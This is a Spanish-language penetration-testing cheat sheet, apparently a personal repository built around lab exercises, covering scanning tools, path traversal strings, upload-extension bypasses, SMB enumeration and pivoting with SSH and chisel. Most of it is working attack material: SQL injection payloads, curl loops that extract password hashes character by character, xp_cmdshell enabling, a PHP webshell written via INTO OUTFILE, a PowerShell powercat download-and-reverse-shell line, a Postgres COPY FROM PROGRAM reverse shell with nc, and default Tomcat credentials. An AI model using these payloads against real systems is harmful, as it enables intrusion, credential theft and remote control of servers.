
# Mi repositorio sobre herramientas y configuraciones para la fase de reconocimiento de vulnerabilidades. 

# Herramientas de escaneo 
## Nmap
```shell
- nmap -sn <ip/24>
- nmap -sV -sT -O -p- <ip>
- nmap -sTCV <ip>
- nmap -sS -sC --top-ports 100 <ip>
- nmap --script vuln <ip>
- nmap -f -sS -sV -Pn --script auth <ip>
- nmap -f -sS -sV -Pn --script default <ip>
```
#### Puertos UDP
```shell
- nmap -sU -sC --top-ports 100 <ip>
```
## Gobuster
```shell
- gobuster dir -u <url> -w /home/kali/Downloads/seclist/directory-list-lowercase-2.3-medium.txt -x php,html,txt
```
#### Realizar fuzzing
```shell
- gobuster fuzz -u https://example.com?FUZZ=test -w parameter-names.txt
```
## Nuclei
#### Escaneo de un solo objetivo
```shell
- nuclei -target https://example.com
```
#### Escaneo de varios objetivos
```shell
- nuclei -targets urls.txt
```
#### Network scan
```shell
- nuclei -target <ip>/24 
```
## Nikto
```shell
- nikto -h example.com
- nikto -h example.com -port 8083
- nikto -h example.com -maxtime number.of.seconds
```
## Wpscan
```shell
- wpscan --url <url>
```
### Ataque de diccionario
```shell
- wpscan --url <url> --passwords <ruta de diccionarios>
```
### Enumerar usuarios
```shell
- wpscan --url <url> --enumerate u 
```
## SMB
### Crackmapexec
```shell
- crackmapexec smb IP
- crackmapexec smb IP -u <usuario> -p <contraseña/directorio de contraseñas>
```
### Smbmap
```shell
- smbmap -H <IP> -R <carpeta>
- smbmap -H <IP> -u <USUARIO> -p <CONTRASEÑA>
- smbmap -H <IP> -u <USUARIO> -P <ARCHIVO_CON_CONTRASEÑAS>
```
### Smbclient
```shell
- smbclient //<IP>/<ruta> -U <usuario>
- smbclient -L //<IP> -U <USUARIO> 
```
### Rpcclient
```shell
- rpcclient -U '' -N <ip objetivo>
- rpcclient <IP> -U <USUARIO>
```
### Comandos
```shell
- enumdomusers
- queryuser <RID> <--- Obtén detalles de un usuario específico.
enumdomgroups:
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
- netshareenum <--- Obtener detalles de recursos compartidos.
- getdominfo:
```

# Path Traversal 
```shell
- file=../../../../../../../etc/passwd
- file=/etc/passwd
- file=....//....//....//etc/passwd
- file=..%252f..%252f..%252fetc/passwd
- file=/var/www/images/../../../etc/passwd
- file=../../../etc/passwd%00.png 
```

# Upload extensions

```shell
- PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module
- Working in PHPv8: .php, .php4, .php5, .phtml, .module, .inc, .hphp, .ctp
- ASP: .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml
- Jsp: .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action
- Coldfusion: .cfm, .cfml, .cfc, .dbm
- Flash: .swf
- Perl: .pl, .cgi
- Erlang Yaws Web Server: .yaws
```
# SQLi
```shell
select version();
select system_user();
show databases;
SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';
// To improve its security, the user's password is stored in the authentication_string field as a Caching-SHA-256 algorithm
https://dev.mysql.com/doc/refman/8.0/en/caching-sha2-pluggable-authentication.html
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
SELECT @@version;
SELECT name FROM sys.databases;
SELECT * FROM offsec.information_schema.tables;
select * from offsec.dbo.users;
```
## Payloads
```shell
'
'--
'--+
'--+//
'%23
'%23+
'%23+//
"
"--
"--+
"--+//
'+oR+1=1+in+(sEleCt+'OFFSEC321')+--+
'+oR+'OFFSEC'='OFFSEC
'+oR+'OFFSEC'='OFFSEC'+--+
'+AnD+'OFFSEC'='OFFSEC
'+AnD+'OFFSEC'='OFFSEC'+--+
'+AND+IF+(1=1,sleep(3),'false
'+AND+IF+(1=1,sleep(1),'false
'+AND+IF+(1=1,sleep(1),'false
'+AND+IF+(1=1,sleep(3),'false
'+AND+IF+(1=1,sleep(3),'false')+--+
'+AND+IF+(1=1,sleep(1),'false')+--+
'+AND+IF+(1=1,sleep(1),'false')+--+
'+AND+IF+(1=1,sleep(3),'false')+--+
';+IF+(1=1)+WAITFOR+DELAY+'0:0:03'--
'+OR+1=1;+IF+(1=1)+WAITFOR+DELAY+'0:0:03'--
'+WAITFOR+DELAY+'0:0:03'--
';+WAITFOR+DELAY+'0:0:03'--
'+WAITFOR+DELAY+'0:0:03
');+WAITFOR+DELAY+'0:0:03'--
'));+WAITFOR+DELAY+'0:0:03'--
')));+WAITFOR+DELAY+'0:0:03'--
"+WAITFOR+DELAY+'0:0:03'--
";+WAITFOR+DELAY+'0:0:03'--
"+WAITFOR+DELAY+'0:0:03
';EXECUTE+sp_configure+'show+advanced+options',1;RECONFIGURE;EXECUTE+sp_configure+'xp_cmdshell',1;RECONFIGURE;EXECUTE+xp_cmdshell+'ping+192.168.45.156';--
';SELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END--
';SELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(3)+END--
';SELECT+pg_sleep(3)+--
';SELECT+pg_sleep(3)||'bar'+--
');SELECT+pg_sleep(3)+--
'));SELECT+pg_sleep(3)+--
'+AND+1=(select+1+from+pg_sleep(3))--
```
## Error-based
``` shell
' or 1=1 in (select @@version) -- //
' OR 1=1 in (SELECT * FROM users) -- //
' or 1=1 in (SELECT password FROM users) -- //
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```
## Scripts
```shell
// Obtener nombre de tablas
curl -s -i -X POST -d "uid='+or+1=1+in+(select+table_name+FROM+information_schema.tables)+--+&password=pwd" http://192.168.211.16/index.php -x "127.0.0.1:8080" | grep "Warning" 

// Obtener columnas
curl -s -i -X POST -d "uid='+or+1=1+in+(select+column_name+FROM+information_schema.columns WHERE table_name='users')+--+&password=pwd" http://192.168.211.16/index.php -x "127.0.0.1:8080" | grep "Warning" 

// Obtener usuarios
curl -s -i -X POST -d "uid='+or+1=1+in+(select++username+FROM+users)+--+&password=pwd" http://192.168.211.16/index.php -x "127.0.0.1:8080" | grep "Warning" 

// Obtener password de un usuario
curl -s -i -X POST -d "uid='+or+1=1+in+(select+password+FROM+users+where+username='admin')+--+&password=pwd" http://192.168.211.16/index.php -x "127.0.0.1:8080" | grep "Warning"
```
## UNION-Based
```shell
// LIKE
%

// Determinar N columnas, iterar hasta el error
' ORDER BY 1-- //
' ORDER BY 1--

// Determinar # de columnas y tipo de dato
' UNION SELECT NULL--
' UNION SELECT 'a',NULL--
' UNION SELECT NULL FROM DUAL-- (ORACLE)

// % Todos los registros + actual db, usuario y version
%' UNION SELECT database(), user(), @@version, null, null -- //

// Base de datos, usuario y version de DB
' UNION SELECT null, null, database(), user(), @@version  -- //

// Nombre de tabla, columna y actual db
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //

// Usuario, password (MYSQL -> PASSWD MD5)
' UNION SELECT null, username, password, description, null FROM users -- //
```
## Concatenar cadenas
```shell
'foo'||'bar' #ORACLE
'foo'+'bar'  #MICROSOFT
'foo'||'bar' #POSGRES
'foo' 'bar'  #MYSQL
CONCAT('foo','bar') #MYSQL
```
## Substring
```shell
SUBSTR('foobar', 4, 2)      Oracle
SUBSTRING('foobar', 4, 2)   Microsoft
SUBSTRING('foobar', 4, 2)   PostgreSQL
SUBSTRING('foobar', 4, 2)   MySQL
```
## Listar Schema
```shell
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'Users'

' UNION SELECT table_name, NULL FROM information_schema.tables--    (Lista tablas)
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_kzdtmr'--  (Listar columnas)
' UNION SELECT username_ophemz, password_cuiuxw FROM users_kzdtmr--  (Consultyar información)
# Tomcat default credentials
```
## Script 
```shell
// Identicar sentencia para minar datos
curl -s -i -X POST -d "item='+UNION+SELECT+NULL,(SELECT 'OFFSEC'),NULL,NULL,NULL+--+" http://192.168.211.16/search.php -x "127.0.0.1:8080" | grep "OFFSEC"

// minar datos mediante una sub consulta
curl -s -i -X POST -d "item='+UNION+SELECT+NULL,(select+CONCAT(username,'--',password)+FROM+users+LIMIT+1),NULL,NULL,NULL+--+" http://192.168.211.16/search.php -x "127.0.0.1:8080"

// minar datos mediante las columnas disponibles
curl -s -i -X POST -d "item='+UNION+SELECT+NULL,CONCAT(username,'--',password),NULL,NULL,NULL+FROM+users+--+" http://192.168.211.16/search.php -x "127.0.0.1:8080"
```
## Boolean-based
```shell
http://192.168.50.16/blindsqli.php?user=offsec'+AND+1=1+--+//
offsec' AND '1'='1
offsec' AND '1'='2
```
## Minar información 
```shell
// GET PWD HASH (variar Administrator'), 2, 1) y el caracter)
offsec' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm    

//PROCESS
offsec' AND '1'='1

// Confirmed that table is users
offsec' AND (SELECT 'a' FROM users LIMIT 1)='a 

// Confirmed that user is administrator
offsec' AND (SELECT 'a' FROM users WHERE username='administrator')='a

// Get lengh the pwd, variar 1
offsec' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a    

// Variar password,2,1)  y sername='administrator')='b
offsec' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```
```shell 
// Identificar vulnerabilidad, revisando la longitud de respuesta 
echo "[+] Longitud inicial:" && curl -s -i -X GET "http://192.168.211.16/blindsqli.php?user=admin" -x "127.0.0.1:8080" |wc ; while IFS= read -r p; do echo "[+] Payload: $p" && curl -s -i -X GET "http://192.168.211.16/blindsqli.php?user=admin$p" -x "127.0.0.1:8080" | wc ;done < sqli_payloads.txt
```
```shell
// Identificar tablas con diccionario
echo "Longitud inicial:" && curl -s -i -X GET "http://192.168.211.16/blindsqli.php?user=admin" -x "127.0.0.1:8080" | wc -m; while IFS= read -r p; do echo "SQL injection $p:" && curl -s -i -X GET "http://192.168.211.16/blindsqli.php?user=admin'+AND+(SELECT+'a'+FROM+$p+LIMIT+1)='a" -x "127.0.0.1:8080" | wc -m;done < sqli_tables.txt
```
```shell
// Identificar columns con diccionario
echo "Longitud inicial:" && curl -s -i -X GET "http://192.168.211.16/blindsqli.php?user=admin" -x "127.0.0.1:8080" | wc -m; while IFS= read -r p; do echo "SQL injection $p:" && curl -s -i -X GET "http://192.168.211.16/blindsqli.php?user=admin'+AND+(SELECT+column_name+FROM+information_schema.columns+WHERE+table_name='users'+and+column_name='$p'+LIMIT+1)='$p" -x "127.0.0.1:8080" | wc -m;done < sqli_columns.txt
```
```shell
// Identificar nombre de usuario, wordlist
echo "Longitud inicial:" && curl -s -i -X GET "http://192.168.211.16/blindsqli.php?user=admin" -x "127.0.0.1:8080" | wc -m; while IFS= read -r p; do echo "SQL injection $p:" && curl -s -i -X GET "http://192.168.211.16/blindsqli.php?user=admin'+AND+(SELECT+username+FROM+users+WHERE+username='$p'+LIMIT+1)='$p" -x "127.0.0.1:8080" | wc -m;done < sqli_users.txt
```
```shell
// Identificar tamaño de passwd. el usuario debe ser valido
for p in $(seq 1 1 50); do echo "$p" && curl -s -i -X GET "http://192.168.211.16/blindsqli.php?user=admin'+AND+(SELECT+'a'+FROM+users+WHERE+username='admin'+AND+LENGTH(password)>$p)='a" -x "127.0.0.1:8080" | wc -m; done
```
```shell
// Minar hash de password letra por letra
for p in $(seq 1 1 32); do while IFS= read -r pp; do RES=$(curl -s -i -X GET "http://192.168.211.16/blindsqli.php?user=admin'+AND+(SELECT+SUBSTRING(password,$p,1)+FROM+users+WHERE+username='admin')='$pp" -x "127.0.0.1:8080" | wc -m) && if [ $RES == "1476" ]; then echo "$pp:$RES" && break; fi ;done < sqli_letras_numeros.txt ; done
```
```shell
// Minar hash de password letra por letra
for p in $(seq 1 1 32); do while IFS= read -r pp; do RES=$(curl -s -i -X GET "http://192.168.211.16/blindsqli.php?user=admin'+AND+(SELECT+SUBSTRING(password,$p,1)+FROM+users+WHERE+username='admin')='$pp" -x "127.0.0.1:8080" | wc -m) && if [ $RES == "1476" ]; then echo "$pp:$RES" && break; fi ;done < sqli_letras_numeros.txt ; done
```
## Time-based
```shell
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
select if(1=0,true,false);
```
### MySQL
```shell
'+AND+IF+(1=1,sleep(3),'false
'+AND+IF+(1=1,sleep(3),'false')+--+
```
### Postgres
```shell
1';SELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
';select+pg_sleep(10)--
```
### MSSQL
```shell
';+WAITFOR+DELAY+'0:0:03'--
```
```shell
// Identificar SQLi basado en tiempo
while IFS= read -r p; do echo "[+] Payload: $p"; start=$(date +%s); curl -s -i -X GET "http://192.168.239.16/blindsqli.php?user=admin$p" -x "127.0.0.1:8080"| grep -E "SQL syntax|500|Internal Server|OFFSEC321|Content-Length"; end=$(date +%s); echo "Time: $(($end-$start)) seconds"; done < sqli_payloads.txt
```

## Code execution
### MSSQL
```shell
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'whoami';
```
```shell
';EXECUTE+sp_configure+'show+advanced+options',1;RECONFIGURE;EXECUTE+sp_configure+'xp_cmdshell',1;RECONFIGURE;EXECUTE+xp_cmdshell+'ping+192.168.45.156';--
```
```shell
';EXECUTE+sp_configure+'show+advanced+options',1;RECONFIGURE;EXECUTE+sp_configure+'xp_cmdshell',1;RECONFIGURE;EXECUTE+xp_cmdshell+'powershell%20%2dencode%20JABjAGw...
```
```shell
pwsh
$Text = 'IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.45.222:8081/powercat.ps1");powercat -c 192.168.45.222 -p 444 -e powershell'                
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)           
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText
```
### MySQL
```shell
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
<? system($_REQUEST['cmd']); ?>
```
```shell
/var/www/
/var/www/html
/var/www/htdocs
/usr/local/apache2/htdocs
/usr/local/www/data
/var/apache2/htdocs
/var/www/nginx-default
/srv/www/htdocs
/usr/local/var/www
```
```shell
curl -s -i -X POST -d "item='+UNION+SELECT+NULL,\"<?php+system(\$_GET['cmd']);?>\",NULL,NULL,NULL+INTO+OUTFILE+\"/var/www/html/tmp/webshell.php\"+--+" http://192.168.239.19/search.php -x "127.0.0.1:8080" | grep "OFFSEC"

curl -s 'http://192.168.239.19/tmp/webshell.php?cmd=whoami'
```
### Postgres
Read files
```shell
CREATE TABLE read_files(output text);
COPY read_files FROM ('/etc/passwd');
SELECT * FROM read_files;
```
Command execution
```shell
CREATE TABLE shell(output text);
COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f';
```
```shell
';CREATE+TABLE+shell(output+text);COPY+shell+FROM+PROGRAM+'ping+192.168.45.156';--
';COPY+shell+FROM+PROGRAM+'nc+%2de+/bin/sh+192.168.45.156+4444';--
```
Escribir
```shell
';CREATE+TABLE+T+(c+text);INSERT+INTO+T(c)+VALUES+('hola');SELECT+*+FROM+T;COPY+T(c)+TO+'/tmp/test.txt';--
```
## Credenciales Tomcat por defecto.
```shell
admin:admin

tomcat:tomcat

admin:

admin:s3cr3t

tomcat:s3cr3t

admin:tomcat
```
### Pivoting
### Local 
```shell
- ssh -L <puerto local>:127.0.0.1:<puerto remoto> <usuario>@<ip> 
```
### Remoto
```shell
- ssh -R <puerto local>:127.0.0.1:<puerto remoto> <usuario>@<ip> 
```
### Dinámico 
```shell
- ssh -D <puerto local que actuará como proxy> <usuario>@<ip> 
```
### Uso e instalación Chisel
#### Lado atacante
```shell
- python3 -m http.server 80 <--- para descargar chisel de lado de la victima.
- chmod +x chisel_linux_amd64
- ./chisel_linux_amd64 --reverse -p <puerto> 
```
#### Lado víctima
```shell
- curl http://<ip>/chisel_linux_amd64 -o chisel <--- para descargar chisel en la victima con el servidor del atacante.
- chmod +x chisel
- ./chisel client <ip>:<ip> R:socks 
```
<div align="left">
  <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/linux/linux-original.svg" height="39" alt="linux logo"  />
</div>
